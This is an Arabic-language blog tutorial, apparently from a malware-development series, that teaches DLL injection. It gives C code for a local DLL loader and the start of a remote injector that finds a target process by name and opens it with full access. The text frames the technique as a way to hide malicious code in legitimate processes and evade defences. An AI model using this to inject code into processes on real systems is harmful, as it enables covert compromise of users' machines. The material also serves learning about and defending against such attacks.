<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DLL Injection</title>
    <link rel="icon" href="../src/Pics/DLLi.webp" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet"
        crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
    <style>
        html,
        body {
            font-family: 'Cairo', sans-serif;
            margin: 0;
            padding: 0;
            background-color: black;
            overflow-x: hidden;
        }

        nav {
            width: 100%;
            height: 10vh;
            position: sticky;
        }

        .nav-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: space-around;
            align-items: center;
        }

        .logo {
            font-size: 2rem;
            font-weight: bold;
            cursor: pointer;
            background: -webkit-linear-gradient(#FFD700, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo span {
            cursor: pointer;
            background: -webkit-linear-gradient(#FFD700, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .hamburg,
        .cancel {
            cursor: pointer;
            position: absolute;
            right: 15px;
            top: 10px;
            color: #FFD700;
            display: none;
            font-size: clamp(2.5rem, 0.5rem + 5vw, 3rem);
        }

        .nav-container .links {
            display: flex;
        }

        .nav-container .links a {
            font-size: 1.2rem;
            color: white;
            margin: 0 20px;
            text-decoration: none;
            font-weight: 550;
            transition: 0.3s linear;
        }

        .nav-container .links a:hover {
            color: #FFD700;
            border-bottom: 2px solid #FFD700;
        }

        .dropdown {
            max-height: 100vh;
            overflow-y: auto;
            z-index: 100;
            position: absolute;
            top: 0;
            transform: translateY(-500px);
            width: 100%;
            height: auto;
            backdrop-filter: blur(4px) brightness(40%);
            box-shadow: 0 0 20px black;
            transition: 0.2s linear;
        }

        .dropdown .links a {
            display: flex;
            color: white;
            text-decoration: none;
            padding: 15px 0;
            justify-content: center;
            align-items: center;
            transition: 0.2s linear;
        }

        .dropdown .links a:hover {
            background-color: #FFD700;
            color: black;
        }

        .dark-mode {
            background-color: #222;
            color: #f4f4f4;
        }

        header {
            background: -webkit-linear-gradient(#FFD700, #ffed00);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            text-align: center;
            border-bottom: 1px solid #FFD700;
        }



        header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 0 15px;
        }


        .article {
            background: white;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .article h2 {
            margin-top: 0;
            border-top: 2px solid #FFD700;
            border-bottom: 2px solid #FFD700;
            padding-bottom: 5px;
        }

        .code-block {
            background: #FFD700;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
            direction: ltr;
            text-align: left;
            font-size: 15px;
        }


        @media (max-width:884px) {
            nav .logo {
                position: absolute;
                top: 16px;
                left: 15px;
                font-size: 1.5rem;
            }

            .nav-container .links {
                display: none;
            }

            .hamburg,
            .cancel {
                display: block;
            }

        }


        @media (max-width:440px) {
            .nav-container {
                margin-top: 10px;
            }

            table {
                display: block;
                overflow-x: auto;
            }
        }

        .footer {
            background: #111;
            color: #fff;
            text-align: center;
            padding: 5px;
            position: relative;
            bottom: 0;
            width: 100%;
            margin-top: auto;
        }

        .footer a {
            color: #FFD700;
            text-decoration: none;
            font-weight: bold;
        }

        .footer a:hover {
            color: #35a849;
        }

        .ltr {
            direction: ltr;
            text-align: left;
        }

        .article-image {
            width: 100%;
            height: auto;
            border-radius: 8px;
        }

        .nav-buttons a {
            background: #FFD700;
            color: black;
            padding: 10px 0;
            border-radius: 5px;
            text-decoration: none;
            transition: background-color 0.3s;
            text-align: center;
            flex: 1;
            margin: 0 10px;
            max-width: 150px;
            font-size: 20px;
        }

        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }

        .nav-buttons a:hover {
            background: #51460c;
            color: #fff;
        }

        .download-link {
            text-decoration: none;
            color: #FFD700;
            font-weight: bold;
            transition: color 0.3s ease;
        }

        .download-link:hover {
            color: #51460c;
            text-decoration: underline;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px auto;
            text-align: center;


        }

        th,
        td {
            border: 1px solid black;
            padding: 7px;
        }

        th {
            background-color: #FFD700;
        }
    </style>
</head>

<body>
    <section>
        <nav>
            <div class="nav-container" style="direction: ltr;">
                <div class="logo" data-aos="zoom-in" data-aos-duration="800">
                    <span>0x4de1</span>
                </div>
                <div class="links">
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100"><a
                            href="https://0x4de1.github.io">Home</a></div>
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300"><a
                            href="../MalDev.html">Mal Dev</a></div>
                    <div class="link" data-aos="fade-up" data-aos-duration="800" data-aos-delay="400"><a
                            href="https://0x4de1.medium.com/" id="blogLink">CTF Writeups</a></div>
                </div>
            </div>
            <i class="fa-solid fa-bars hamburg" onclick="hamburg()"></i>
            <div class="dropdown">
                <div class="links">
                    <a href="https://0x4de1.github.io">Home</a>
                    <a href="../MalDev.html">Mal Dev</a>
                    <a href="https://0x4de1.medium.com">CTF Writeups</a>
                    <i class="fa-solid fa-xmark cancel" onclick="cancel()"></i>
                </div>
            </div>
        </nav>
        <header>
            <h1 id="article-title" style="direction: ltr;">DLL Injection</h1>
        </header>
        <div class="container">
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                <img src="../src/Pics/DLLi.webp" alt="HomeLab" class="article-image" loading="lazy">
            </div>
            <div class="article" data-aos="zoom-in" data-aos-duration="800">
                <p style="text-align: center; font-weight: bold;">السَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ
                </p>
                <p style="text-align: center; font-weight: bold;">اللَّهُمَّ صَلِّ عَلَى مُحَمَّدٍ وَعَلَى آلِ
                    مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى إِبْرَاهِيمَ وَآلِ
                    إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ، وَبَارِكْ عَلَى مُحَمَّدٍ وَعَلَى آلِ مُحَمَّدٍ، كَمَا
                    بَارَكْتَ عَلَى إِبْرَاهِيمَ وَآلِ إِبْرَاهِيمَ، إِنَّكَ حَمِيدٌ مَجِيدٌ،<br>
                    <br>
                    ✨🌙 هَلَّ هِلالُ الخَيْرِ، فَأسألُ اللهَ أنْ يَملأ قُلوبَكم بالنُّورِ واليقينِ، مُبَارَكٌ عَلَيكُمُ
                    الشَّهْرُ 🌙✨
                <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                    <img src="../src/Pics/Ramadan2.jpg" alt="HomeLab" class="article-image" loading="lazy">
                </div>
                </p>
            </div>
            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                <h2>Introduction</h2>
                <p>[+] فـ عالم الـ Malware Development ، كل مـ بتكون قادر ع تنفيذ الكود بتاعك داخل عمليات تانية
                    (Processes) ، كل مـ بتزيد فرصتك فـ التهرب من الحماية والتحكم فـ السيستم .. وده اللـ بنسميه <code
                        style="background: #FFD700; font-size: 14px;">Process Injection</code> ، واللـ من أشهر أساليبه
                    هو <code style="background: #FFD700; font-size: 14px;">DLL Injection</code>.</p>
                <p style="font-weight: bold;">[+] بس إيه هو DLL Injection بالظبط؟</p>
                <p>الفكرة باختصار إنك بتاخد ملف DLL خاص بيك وبتـ Inject الملف ده داخل Process تانية ، بحيث الكود اللـ
                    جوه يتنفذ كأنه
                    جزء من العملية دي .. وده بيديك صلاحيات كتير زي:</p>
                <ul>
                    <li>تقدر تشغل كود ضار جوا عملية شرعية زي chrome.exe أو notepad.exe.
                    </li>
                    <li> تقدر تتجاوز الحماية لأن الـ DLL هيشتغل من جوه العملية ، مش كبرنامج مستقل.
                    </li>
                    <li> تقدر تعدل فـ سلوك الأبلكيشنز من غير مـ حد ياخد باله ، يعني ممكن برنامج يبقى شغال عادي بس بيعمل
                        حاجات فـ الخلفية لصالحك.
                    </li>
                </ul>
                <p style="font-weight: bold;">[+] وهنتكلم عن نوعين من الـ DLL Injection وهما :</p>
                <ol style="font-weight: bold; direction: ltr;">
                    <li>Local DLL Execution</li>
                    <li>Remote DLL Injection</li>
                </ol>
                <h2 style="direction: ltr;">1. Local DLL Execution :</h2>
                <p>[+] فـ الجزء ده هنتعلم إزاي نصنع ملف DLL .. وكمان نعمل برنامج بحيث يقدر يـ Load ملف الـ DLL ويشغلة ،
                    تعالي نشوف هنعمل إيه :</p>
                <ol>
                    <li>هتفتح برجيكت جديد ، وهتختار التمبليت بتاع الـ DLL :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-1.png" alt="LocalDLLInjection-1" class="article-image"
                            loading="lazy">
                    </div>
                    <li>هتمسح الأجزاء اللـ متعلمة بالأحمر لإن مش محتاجينها حاليا :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-2.png" alt="LocalDLLInjection-2" class="article-image"
                            loading="lazy">
                    </div>
                    <li>محتاج تعرف البرنامج إنه ميدورش ع الملفات اللـ مسحناهم ، هتقف ع إسم البروجيكت من الـ Solution
                        Exeplorer و <code
                            style="background: #FFD700; font-size: 14px;">Right-Click > Properties > C/C++ > Precompiled Headers</code>
                        وتختار <code style="background: #FFD700; font-size: 14px;">Not Using Precompiled Headers</code>.
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-3.png" alt="LocalDLLInjection-3" class="article-image"
                            loading="lazy">
                    </div>
                    <li>هتعدل إمتداد الفايل بدل cpp هتخليه c .. وهتضيف المكاتب العادية كالعادة .. وهنضيف السطرين دول فـ
                        حتة
                        الـ <code style="background: #FFD700; font-size: 14px;">DLL_PROCESS_ATTACH</code> :</li>
                    <div class="code-block"><code>MessageBoxW(NULL, L"You Have Been Hacked HAHAHAHAHAHAHA", L"Hacked", MB_OK | MB_ICONWARNING);<br>
                            break;</code></div>
                    ودا معناه إن لما ملف الـ DLL يرتبط مع Process .. يظهرله رسالة فيها إنه اتهكر .. (ودا مجرد تيست بس
                    يعني ، عدل وغير إنت براحتك).<br>
                    بالنسبة لتفاصيل البراميترز وعشان تفهم كل جزء ليه بالشكل ده ، فـ بص ع الـ Documentation من <a
                        href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw"
                        target="_blank" class="download-link">[هنا]</a>.
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-4.png" alt="LocalDLLInjection-4" class="article-image"
                            loading="lazy">
                    </div>
                    <li>هتعمل Build للبرجيكت ع الـ Debug .. وبكدا الحمدلله عملنا ملف DLL فكرتة بسيطة.</li>
                </ol>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="font-weight: bold;">[+] تعالي بقي نعمل البرنامج اللـ هيشغل ملف الـ DLL :</p>
                <ol>
                    <li>هتفتح برجيكت جديد .. هتضيف الـ <code
                            style="background: #FFD700; font-size: 14px;">main func</code> .. وهنستخدم عملية من <code
                            style="background: #FFD700; font-size: 14px;">Windows APIs</code> بـ اسم <code
                            style="background: #FFD700; font-size: 14px;">LoadLibraryW</code> ،
                        وهنضيف جواها إسم ملف الـ DLL اللـ عملناه :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-5.png" alt="LocalDLLInjection-5" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="font-weight: bold;">[+] هتـ Build البرجيكت ع الـ Debug .. ويلا نجرب نـ رن :</p>
                <ul>
                    <li>هتضيف ملف الـ DLL مع البرجيكت اللـ عملناه .. وهتجرب تشغل هتلاقيه اشتغل وتمام :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-6.png" alt="LocalDLLInjection-6" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p style="font-weight: bold;">[+] طيب دلوقتي لو غيرت ملف الـ DLL ، هل لسه هدخل جوا البروجيكت كل مرة وأ
                    Build وبتاع ؟ .. لا حوار ..
                    تعالي نعدل فـ الكود ونزود شوية إضافات :</p>

                <ol>
                    <li>هنخلي البرنامج بدل مـ ملف الـ DLL يكون جواه ، لا إحنا هنضيفه بنفسنا عشان كل مرة لو غيرنا الملف
                        .. وفـ الكود أنا ضيفت الجزء ده ، كنا قولناه فـ المقالات اللـ قبل كده .. مهمتها إنها بتتأكد إن
                        اليوزر ضاف
                        عنصرين .. ولو أقل من كده يبقي ملف الـ DLL منضفش :</li>

                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-7.png" alt="LocalDLLInjection-7" class="article-image"
                            loading="lazy">
                    </div>
                    <li>هنجرب ولحد هنا تمام :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-8.png" alt="LocalDLLInjection-8" class="article-image"
                            loading="lazy">
                    </div>
                    <li>بعد كده .. زودت شوية حاجات أكتر .. بحيث البرنامج يكون فيه معلومات بتنطلع ، ولو حصل إيرور يظهر
                        إيه اللـ حصل وكده :</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-9.png" alt="LocalDLLInjection-9" class="article-image"
                            loading="lazy">
                    </div>
                </ol>
                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
                <ul>
                    <li>هتلاقي إنه شغال تمام :
                    </li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-10.png" alt="LocalDLLInjection-10" class="article-image"
                            loading="lazy">
                    </div>
                    <li>ولو فتحت <a href="https://sourceforge.net/projects/processhacker/" target="_blank"
                            class="download-link">Process Hacker</a> .. وبحثت بـ الـ PID .. وفتحت الـ <code
                            style="background: #FFD700; font-size: 14px;">Modules</code> .. هتلاقي
                        ملف الـ DLL اللـ
                        عملناه موجود بالفعل.</li>
                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
                        <img src="../src/Pics/LocalDLLi-11.png" alt="LocalDLLInjection-11" class="article-image"
                            loading="lazy">
                    </div>
                </ul>
                <p style="border-top: 2px solid #FFD700;"></p>
                <P>[+] ودا كدا الكود النهائي للـ <code
                        style="background: #FFD700; font-size: 14px;">Local DLL Execution</code> :</P>
                <div class="code-block">
                    <code>
                        #include &lt;Windows.h><br>
                            #include &lt;stdio.h><br><br>
                            
                            int main(int argc, char* argv[]) {<br><br>
                            
                                &nbsp;&nbsp;if (argc < 2) {<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] DLL Missing !!!");<br>
                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                    &nbsp;&nbsp;}<br><br>
                            
                                    &nbsp;&nbsp;printf("[i] Injecting \"%s\" to the Local Process of PID : %d \n", argv[1], GetCurrentProcessId());<br><br>
                            
                                
                                    &nbsp;&nbsp;printf("[i] Loading DLL ... \n");<br><br>
                            
                            
                                    &nbsp;&nbsp;if (LoadLibraryA(argv[1]) == NULL) {<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] LoadLibraryA Failed With Eroor : %d \n", GetLastError());<br>
                                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
                                        &nbsp;&nbsp;}<br>
                                        &nbsp;&nbsp;printf("[i] DONE \n");<br><br>
                            
                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ... ");<br>
                                        &nbsp;&nbsp;getchar();<br><br>
                            
                            
                            
                                        &nbsp;&nbsp;    return 0;<br>
                            }<br>
                            
                    </code>
                </div>
                <br>
                <p style="font-weight: bold;">[+] دلوقتي بقى خلصنا <code
                        style="background: #FFD700; font-size: 14px;">Local DLL Execution</code> ، وعرفنا إزاي نشغل ملف
                    DLL جوه
                    برنامج إحنا اللـ مشغلينه ..
                    بس السؤال هنا .. إزاي نحط الـ DLL بتاعنا جوه برنامج شغال أصلا؟</p>
                <h2 style="direction: ltr;">2. Remote DLL Injection</h2>
                <p>[+] هنا بقى بييجي دور <code style="background: #FFD700; font-size: 14px;">Remote DLL Injection</code>
                    ، اللـ هي من أقوى طرق الـ <code
                        style="background: #FFD700; font-size: 14px;">Process Injection</code> ، و الفكره
                    ببساطة إنك بتاخد ملف DLL ، وبتـ Inject جوه Process شغالة بالفعل ، بحيث الكود بتاعك يشتغل كأنه جزء من
                    البرنامج ده.</p>
                <p>[+] قبل مـ نخش ع الأكواد ، خليني أوضح الفكرة ببساطة .. إحنا عايزين نحقن DLL جوه بروسيس معينه ، بس
                    علشان نعمل كده ، لازم الأول نجيب معلومات عن كل البروسيسيز اللـ شغالة ، وندور ع البروسيس اللـ إحنا
                    مستهدفينها .. طيب إزاي بقي؟</p>
                <ol>
                    <li>بناخد <code style="background: #FFD700; font-size: 14px;">Snapshot</code> لكل العمليات اللـ
                        شغالة باستخدام <code
                            style="background: #FFD700; font-size: 14px;">CreateToolhelp32Snapshot</code>.</li>
                    <li>بعدين نبدأ ندور ع اسم البروسيس اللـ إحنا مستهدفينها ، ولما نلاقيها بناخد <code
                            style="background: #FFD700; font-size: 14px;">Handle</code> عليها باستخدام
                        <code style="background: #FFD700; font-size: 14px;">OpenProcess</code>.
                    </li>
                    <li>بنحجز مساحة في الميموري جوه البروسيس باستخدام <code
                            style="background: #FFD700; font-size: 14px;">VirtualAllocEx</code> ، وبعدها بنكتب مسار الـ
                        DLL فيها
                        باستخدام <code style="background: #FFD700; font-size: 14px;">WriteProcessMemory</code>.</li>
                    <li>بعد كده ، بنشغل الـ DLL جوه البروسيس باستخدام <code
                            style="background: #FFD700; font-size: 14px;">CreateRemoteThread</code> ، واللـ بيخلينا
                        نستدعي
                        <code style="background: #FFD700; font-size: 14px;">LoadLibraryW</code> عشان نحمل الـ DLL جوه
                        البروسيس.
                    </li>
                </ol>
                <p style="font-weight: bold;">[+] يلا نبدأ نشوف الأكواد:</p>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="font-weight: bold; font-size: larger; direction: ltr;">Step 1 : Get process information</p>

                <p>أول حاجة ، هنضيف مكتبة <code style="background: #FFD700; font-size: 14px;">Tlhelp32.h</code> لإن
                    هنستخدم دوال منها:</p>
                <div class="code-block"><code>#include &lt;Tlhelp32.h>
                    </code></div>
                <p>بعد كده ، هنكريت دالة وظيفتها إنها تلاقي البروسيس المستهدفه وتمسك <code
                        style="background: #FFD700; font-size: 14px;">Handle</code> عليها ، ودي أنا سميتها
                    <code style="background: #FFD700; font-size: 14px;">GetRemoteProcessHandle</code> ، والدالة دي
                    بتاخد:
                </p>
                <ul>
                    <li>szProcessName: اسم البروسيس اللـ بندور عليها.</li>
                    <li>dwProcessId: هنحفظ فيه الـ PID.</li>
                    <li>hProcess: هنحفظ فيه الهاندل اللـ هنستخدمه بعدين.</li>
                </ul>
                <div class="code-block"><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
                </code></div>
                <p>هنستخدم <code style="background: #FFD700; font-size: 14px;">CreateToolhelp32Snapshot</code> ، واللـ
                    وظيفتها إنها تاخد لقطة من العمليات اللـ شغالة دلوقتي ع
                    الجهاز ، وترجع <code style="background: #FFD700; font-size: 14px;">Handle</code> نقدر نستخدمه بعدين
                    ، ولو الدالة فشلت في إنها تاخد <code style="background: #FFD700; font-size: 14px;">Snapshot</code> ،
                    هتطلع Error وتخرج
                    من الفانكشن .. وتقدر تشوف الـ Documentation بتاعها من
                    <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot"
                        target="_blank" class="download-link">[هنا]</a>.
                </p>
                <div class="code-block"><code>HANDLE hSnapshot = NULL;<br><br>
                        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);<br>
                        if (hSnapshot == INVALID_HANDLE_VALUE) {<br>
                            &nbsp;&nbsp;printf("[!] CreateToolhelp32Snapshot Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;goto _EndOfFunction;<br>
                        }<br>
                        </code></div>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="font-weight: bold; font-size: larger; direction: ltr;">Step 2 : Search for target process</p>
                <p>دلوقتي هنبدأ نعدي ع كل البروسيسيز الموجودة فـ الـ <code
                        style="background: #FFD700; font-size: 14px;">Snapshot</code> ، وندور ع اسم البروسيس اللـ إحنا
                    مستهدفينها .. وأول بروسيس هنجيبها باستخدام <code
                        style="background: #FFD700; font-size: 14px;">Process32First</code> : وتقدر تشوف الـ
                    Documentation بتاعها من
                    <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first"
                        target="_blank" class="download-link">[هنا]</a>.
                </p>
                <div class="code-block"><code>PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };<br><br>
                        if (!Process32First(hSnapshot, &Proc)) {<br>
                            &nbsp;&nbsp;printf("[i] Process32First Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;goto _EndOfFunction;<br>
                        }<br>
                        </code></div>
                <p>[+] بعد كده احنا عاوزين نعمل لوب تعدي ع كل البروسيسيز ، وناخد معلوماتهم ونحفظها فـ Struct اسمها <code
                        style="background: #FFD700; font-size: 14px;">Proc.</code>
                    وبعدين ندور ع بروسيس معينه بالاسم بتاعها ، ولو لقيناها ، نجيب الـ <code
                        style="background: #FFD700; font-size: 14px;">Process ID</code> بتاعه ونفتحه بصلاحيات
                    معينة ، والخطوات للجزء ده كالتالي :</p>
                <ol>
                    <li style="font-weight: bold;">تجهيز مكان نحفظ فيه اسم البروسيس :</li>
                    أول حاجة بنتأكد إن البروسيس ليه اسم فعلا <code
                        style="background: #FFD700; font-size: 14px;">(Proc.szExeFile)</code> وبعد كده بنشوف حجمه <code
                        style="background: #FFD700; font-size: 14px;">(dwSize)</code>.
                    كمان بنجهز <code style="background: #FFD700; font-size: 14px;">Array (LowerName)</code> عشان نحط
                    فيها الاسم بعد تحويله لحروف صغيرة ، ونمسح أي بيانات قديمة منها
                    باستخدام <code style="background: #FFD700; font-size: 14px;">()RtlSecureZeroMemory</code>.
                    <div class="code-block"><code>WCHAR LowerName[MAX_PATH * 2]; <br><br>

                        if (Proc.szExeFile) { <br>
                            &nbsp;&nbsp;DWORD dwSize = lstrlenW(Proc.szExeFile); <br>
                            &nbsp;&nbsp;DWORD i = 0;<br><br>
                        
                            &nbsp;&nbsp;RtlSecureZeroMemory(LowerName, MAX_PATH * 2); <br>
                        </code></div>
                    <li style="font-weight: bold;">تحويل الاسم لـ Lowercase :</li>
                    دلوقتي هنحول كل الحروف فـ الاسم لـ <code
                        style="background: #FFD700; font-size: 14px;">Lowercase</code> عشان لما نقارن متبقاش عندنا مشاكل
                    بسبب الفرق بين الحروف
                    الكبيرة والصغيرة. <br>
                    بنتأكد الأول إن حجم الاسم أقل من حجم المصفوفة <code
                        style="background: #FFD700; font-size: 14px;">(MAX_PATH * 2)</code> عشان منواجهش مشاكل.
                    وبعدين بنمشي حرف حرف ونحوله باستخدام <code
                        style="background: #FFD700; font-size: 14px;">()tolower</code> ، وفيـالآخر بنضيف <code
                        style="background: #FFD700; font-size: 14px;">'\0'</code> عشان الاسم
                    يكون بشكل نصي سليم.

                    <div class="code-block"><code>if (dwSize < MAX_PATH * 2) {<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;for (; i < dwSize; i++) {<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
                            &nbsp;&nbsp;&nbsp;&nbsp;LowerName[i++] = '\0';<br>
                            }<br>
                </code></div>
                    <li style="font-weight: bold;">المقارنة بين الاسم اللـ اتحول واسم البروسيس اللـ بندور عليها :</li>
                    دلوقتي بعد مـ حولنا الاسم لـ <code style="background: #FFD700; font-size: 14px;">Lowercase</code> ،
                    هنقارنه بالاسم اللـ بندور عليه <code
                        style="background: #FFD700; font-size: 14px;">(szProcessName)</code> باستخدام
                    <code style="background: #FFD700; font-size: 14px;">()wcscmp</code>.<br>
                    لو طلعوا متطابقين يبقى لقينا البروسيس المطلوبه ، فنحفظ الـ Process ID ونحاول نفتح البروسيس بصلاحيات
                    <code style="background: #FFD700; font-size: 14px;">PROCESS_ALL_ACCESS</code>. وتقدر تشوف الـ
                    Documentation بتاعها من <a
                        href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-170"
                        target="_blank" class="download-link">[هنا]</a>.
                    <div class="code-block"><code>if (wcscmp(LowerName, szProcessName) == 0) {<br>
                        &nbsp;&nbsp;*dwProcessId = Proc.th32ProcessID;<br>
                        &nbsp;&nbsp;*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);<br>
                        &nbsp;&nbsp;if (*hProcess == NULL)<br>
                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());<br>
                            &nbsp;&nbsp;break;<br>
                    }</code></div>
                    <li style="font-weight: bold;">لو ملقيناش البروسيس نكمل فـ اللوب :</li>
                    لو الاسم مش مطابق بنكمل ندور ع باقي البروسيسيز باستخدام <code
                        style="background: #FFD700; font-size: 14px;">()Process32Next</code> لحد ما نخلص كل البروسيسات
                    أو
                    نلاقي اللـ بندور عليها ، وتقدر تشوف الـ Documentation بتاعها من <a
                        href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next"
                        target="_blank" class="download-link">[هنا]</a>.
                    <div class="code-block"><code>} while (Process32Next(hSnapshot, &Proc));</code></div>
                </ol>
                <p>[+] آخر جزء فـ الدالة دي هو إننا نقفل الـ <code
                        style="background: #FFD700; font-size: 14px;">Handle</code> اللـ فتحناه باستخدام <code
                        style="background: #FFD700; font-size: 14px;">CloseHandle</code> ، عشان نمنع الـ
                    <code style="background: #FFD700; font-size: 14px;">Handle Leak</code> :
                </p>
                <div class="code-block"><code>_EndOfFunction:<br>
                    &nbsp;&nbsp;if (hSnapshot != NULL)<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hSnapshot);<br>
                    &nbsp;&nbsp;if (*dwProcessId == NULL || *hProcess == NULL)<br>
                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
                    &nbsp;&nbsp;return TRUE;<br>
                    
                    }</code></div>
                <p style="border-top: 2px solid #FFD700;"></p>
                <p style="font-weight: bold; font-size: larger; direction: ltr;">Step 3 : Injecting DLL into the
                    targeted process</p>
                <p>[+] بعد مـ جبنا الهاندل بتاع البروسيس فـ الدالة اللـ فاتت ، دلوقتي جه وقت إننا نحقن الـ DLL فيها
                    عشان يشتغل جوه البروسيس .. خلينا نشوف الخطوات وحدة وحدة:</p>
                <ol>
                    <li style="font-weight: bold;">تجهيز دالة الحقن والمتغيرات الأساسية :</li>
                    <div class="code-block"><code>BOOL DLLInjectionToRemoteProcess(HANDLE hProcess, LPWSTR DllName) {<br>
                        &nbsp;&nbsp;BOOL bSTATE = TRUE;<br>
                        &nbsp;&nbsp;LPVOID pLoadLibraryW = NULL;<br>
                        &nbsp;&nbsp;LPVOID pAddress = NULL;<br>
                        &nbsp;&nbsp;DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);<br>
                        &nbsp;&nbsp;SIZE_T lpNumberOfBytrsWritten = NULL;<br>
                        &nbsp;&nbsp;HANDLE hThread = NULL;</code></div>
                    إيه اللي بيحصل هنا؟
                    قبل مـ نبدأ الحقن ، بنجهز شوية متغيرات هنحتاجها وقت العملية:
                    <ul>
                        <li>bSTATE : ده متغير <code style="background: #FFD700; font-size: 14px;">Bool</code> بنستخدمه
                            عشان نعرف إذا كانت العملية نجحت ولا لا.</li>
                        <li>pLoadLibraryW : هنا هنخزن عنوان <code
                                style="background: #FFD700; font-size: 14px;">LoadLibraryW</code> لما نجيبه بعدين.</li>
                        <li>pAddress : ده هيكون عنوان الميموري اللـ هنحجزها جوه البروسيس المستهدفه.</li>
                        <li>dwSizeToWrite : ده حجم البيانات اللـ هنكتبها فـ ميموري البروسيس ، وبيساوي عدد الحروف فـ اسم
                            الـ</li>
                        DLL * حجم كل حرف (WCHAR).
                        <li>lpNumberOfBytrsWritten : هنستخدمه بعدين عشان نشوف هل كل البيانات اتكتبت فـ الميموري بنجاح
                            ولا</li>
                        لا.
                        <li>Thread : بعد مـ نحقن الـ DLL ، هنستخدمه لإنشاء <code
                                style="background: #FFD700; font-size: 14px;">Thread</code> جديد فـ البروسيس المستهدف
                            لتشغيل الـ
                            DLL.</li>

                    </ul>
                    <li style="font-weight: bold;">نجيب عنوان LoadLibraryW :</li>
                    إحنا هنحتاج <code style="background: #FFD700; font-size: 14px;">LoadLibraryW</code> لأنها المسؤولة
                    عن تحميل الـ DLL جوه البروسيس ، فبناخد عنوانها باستخدام
                    <code style="background: #FFD700; font-size: 14px;">GetProcAddress</code> عشان نقدر نشغلها بعدين.
